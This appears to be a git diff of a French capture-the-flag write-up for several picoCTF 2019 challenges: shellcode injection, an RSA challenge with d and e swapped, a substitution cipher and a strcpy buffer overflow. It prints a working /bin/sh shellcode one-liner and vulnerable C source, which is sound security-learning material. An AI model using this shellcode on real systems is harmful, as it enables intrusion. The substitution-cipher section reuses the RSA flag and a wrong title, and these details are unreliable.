@@ -67,7 +67,7 @@ int main(int argc, char **argv){
 ...
 ```
 
-Ce programme utilise un buffer pour lire l'input de l'utilisateur on peut donc s'en servir pour envoyé un shellcode (Il s’agit donc essentiellement d’un morceau de code compilé arbitraire qui peut être injecté dans un programme afin d’engendrer un shell dans le système d’exploitation exécuté par le programme) aprés quelques recherches concernant le shellcode j'ai trouvé ce payload :
+Ce programme utilise un buffer pour lire l'input de l'utilisateur on peut donc s'en servir pour envoyé un shellcode (Il s’agit essentiellement d’un morceau de code compilé arbitraire qui peut être injecté dans un programme afin d’engendrer un shell dans le système d’exploitation exécuté par le programme) après quelques recherches concernant le shellcode j'ai trouvé ce payload :
 ```bash
 $ (echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; cat )  | ./vuln
 ...
@@ -141,12 +141,12 @@ int main(int argc, char **argv){
 }
 ...
 ```
-Je comprends vite que ce code est presque le même qu'avec le handy-shellcode sauf qu'ici notre shellcode aprés  un offset qui est modulo 256. Pour un début je tente donc de lui envoyé mon shellcode directement :  
+Je comprends vite que ce code est presque le même qu'avec le handy-shellcode sauf qu'ici notre shellcode est executé après  un offset qui est modulo 256. Pour un début je tente donc de lui envoyer mon shellcode directement :  
 
 ![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/slippery1.png)
 
-Mon shellcode est effectivement executé mais pas à la bonne adresse est donc j'ai un segmentation fault.
-Je tente aprés d'executé mon shellcode en remplissant le buffer de 256  caractères suivi de mon shellcode.
+Mon shellcode est effectivement executer mais pas à la bonne adresse et j'ai un segmentation fault.
+Je tente ensuite d'executer le programme en remplissant son buffer de 256  caractères suivi de mon shellcode.
 
 ![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/slippery2.png)
 
@@ -167,14 +167,15 @@ Et Hop j'ai effectivément un shell et le flag.
 
 ### Description 
 
-Connectez-vous sur  `nc 2019shell1.picoctf.com 10814`,...
 En RSA, d est beaucoup plus gros que e, pourquoi ne pas utiliser d pour chiffrer au lieu de e?
+Connectez-vous sur  `nc 2019shell1.picoctf.com 10814`
+
 
 ------
 
 #### Hints
 
-* Qu'est-ce que e en général ?. 
+* C'est quoi la valeur de "e" en général ?. 
 
 ------
 
@@ -184,22 +185,132 @@ En RSA, d est beaucoup plus gros que e, pourquoi ne pas utiliser d pour chiffrer
 une fois connecter au serveur il nous renvoi les paramétres suivants :
 
 ```bash
+$ nc 2019shell1.picoctf.com 10814
 c: 3246567211807903956035755386967723378469000089645359852430311338899740839190191186912796367655591221991073923539783802534343637991859596366133917926183487070028511851491672546150628697450709648276484740441059116769268880830587810651048199357915546440564242235096147024745525549383938798867512940345819471689
 n: 92862994629391715025973326227583472781928051965578118595096998621079516709489523781529594005972923927674610395292210963782547003449976221876961532867478284466283591394095929545356891486644591390877842583027695288887951335923580147704761840841012240495813817062197826156384498734601243045712509995933135061613
 e: 55534726162469284328134833374089125970705191581654686697554612920273578259533132513991933989595141790093397702407611338686991542277109389566561688171186896367716544979539952509680212727662952068636577177373930069448696402121437219985978915997070443631144215446467780163599410246770789910349000677632900578365
 ...
 ```
-En se basant sur l'enoncé du challenge, l'hint et connaissant un peu la cryptographie RSA on comprends vite que dans cette configuration la clé privé d pour dechiffré le chiffré c est la valeur de e par défaut qui est généralement 65537.
+En se basant sur l'enoncé du challenge, l'hint et connaissant un peu la cryptographie RSA je comprends vite que dans cette configuration la clé privé "d" pour dechiffrer le chiffré "c" est la valeur de "e" par défaut qui est généralement 65537.
 
-Maintenant je connais tous les paramétres pour dechiffré le message chiffré, j'ai tous simplement converti ces diffèrents paramètres en hexadecimal puis sur le site : [https://nmichaels.org/rsa.py](https://nmichaels.org/rsa.py) j'ai reussi à dechiffré le message.(Une autre méthode était d'utiliser [RsaCtftool](https://github.com/Ganapati/RsaCtfTool) qui est trés bien manipuler RSA )
+connaissant maintenant tous les paramétres pour dechiffrer le message chiffré, j'ai tous simplement converti ces diffèrents paramètres en hexadecimal puis sur le site : [https://nmichaels.org/rsa.py](https://nmichaels.org/rsa.py) j'ai reussi à dechiffré le message. (Une autre méthode était d'utiliser [RsaCtftool](https://github.com/Ganapati/RsaCtfTool) qui est trés bien pour manipuler RSA ).
 
-![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/slippery2.png)
+![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/rsadecryp.png)
 
+Puis ensuite avec python j'ai converti la chaine hexadecimal dechiffré en utf-8 et bingo flag.
+![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/rsa2.png)
 
-
-
-
-
-
+`picoCTF{bad_1d3a5_4986370}`
 
 
+# Crypto_300_waves_over_lambda 
+
+------
+
+### Titre : slippery-shellcode
+
+### Points : 200
+
+------
+
+### Description 
+
+Nous avons fait beaucoup de substitutions pour chiffrer cela. Pouvez-vous le déchiffrer ?
+Connectez-vous sur  `nc 2019shell1.picoctf.com 4164`
+
+------
+
+#### Hints
+
+* Le Flag n'est pas dans le format habituel. 
+
+------
+
+### Résolution
+Le serveur me renvoi le message ci-dessous. 
+```bash
+$ nc 2019shell1.picoctf.com 4164
+-------------------------------------------------------------------------------
+evinptbm djpj um svxp wgtn - wpjyxjies_um_e_vojp_gtkaht_euokajujko
+-------------------------------------------------------------------------------
+dtouin dth mvkj bukj tb ks humfvmtg cdji ui gvihvi, u dth oumubjh bdj apubumd kxmjxk, tih kthj mjtped tkvin bdj avvzm tih ktfm ui bdj guaptps pjntphuin bptimsgotiut; ub dth mbpxez kj bdtb mvkj wvpjzivcgjhnj vw bdj evxibps evxgh dtphgs wtug bv dtoj mvkj ukfvpbtiej ui hjtguin cubd t ivagjkti vw bdtb evxibps. u wuih bdtb bdj humbpueb dj itkjh um ui bdj jqbpjkj jtmb vw bdj evxibps, lxmb vi bdj avphjpm vw bdpjj mbtbjm, bptimsgotiut, kvghtout tih axzvouit, ui bdj kuhmb vw bdj etpftbduti kvxibtuim; vij vw bdj cughjmb tih gjtmb zivci fvpbuvim vw jxpvfj. u ctm ivb tagj bv gundb vi tis ktf vp cvpz nuouin bdj jqteb gvetgubs vw bdj etmbgj hptexgt, tm bdjpj tpj iv ktfm vw bdum evxibps tm sjb bv evkftpj cubd vxp vci vphitiej mxpojs ktfm; axb u wvxih bdtb aumbpubr, bdj fvmb bvci itkjh as evxib hptexgt, um t wtupgs cjgg-zivci fgtej. u mdtgg jibjp djpj mvkj vw ks ivbjm, tm bdjs kts pjwpjmd ks kjkvps cdji u btgz vojp ks bptojgm cubd kuit.
+...
+```
+Dans la description nous savons que c'est plusieurs substitutions qui ont été effectuer sur le message initial qui contient donc notre flag, je me lance alors à la recherche des algorithmes de décodage de substitution et l'un d'eux est l'analyse fréquentielle. Par exemple, la lettre la plus courante en anglais et français est E, la lettre la plus courante dans le texte crypté est donc probablement la substitution de E. J'utilise donc le site [https://planetcalc.com/8047/](https://planetcalc.com/8047/) qui implémente un bon algorithme utilisaant le principe de la génétique pour trouver la clé de substution utilisée.
+
+![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/waves.png)
+
+
+Le Flag est : 
+`picoCTF{bad_1d3a5_4986370}`
+
+# Binary_Exploitation_100_OverFlow_0
+
+------
+
+### Titre : OverFlow_0
+
+### Points : 100
+
+------
+
+### Hints
+
+* Trouver un moyen de déclencher l'affichage du flag.
+* Si vous essayez de faire le calcul à la main, essayez peut-être d'ajouter quelques caractères supplémentaires. Parfois, il y a des choses que vous n'attendez pas.
+------
+
+### Description 
+
+Cela devrait être facile. Déborder le tampon du programme pour le flag drapeau ?
+
+### Résolution
+En regardant, le code ci-dessouss on remarque qu'il suffit de déborder du buffer de taille 128 qui declenchèra un signal SIGFAULT qui sera capturé et affichera le flag dans la sorti stderr.
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <signal.h>
+
+#define FLAGSIZE_MAX 64
+
+char flag[FLAGSIZE_MAX];
+
+void sigsegv_handler(int sig) {
+  fprintf(stderr, "%s\n", flag);
+  fflush(stderr);
+  exit(1);
+}
+
+void vuln(char *input){
+  char buf[128];
+  strcpy(buf, input);
+}
+
+int main(int argc, char **argv){
+  
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
+    exit(0);
+  }
+  fgets(flag,FLAGSIZE_MAX,f);
+  signal(SIGSEGV, sigsegv_handler);
+  
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  
+  if (argc > 1) {
+    vuln(argv[1]);
+    printf("You entered: %s", argv[1]);
+  }
+  else
+    printf("Please enter an argument next time\n");
+  return 0;
+}
+...
+```
+![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/overflow0.png)
+
+Le Flag est : 
+`picoCTF{3asY_P3a5y1fcf81f9}`
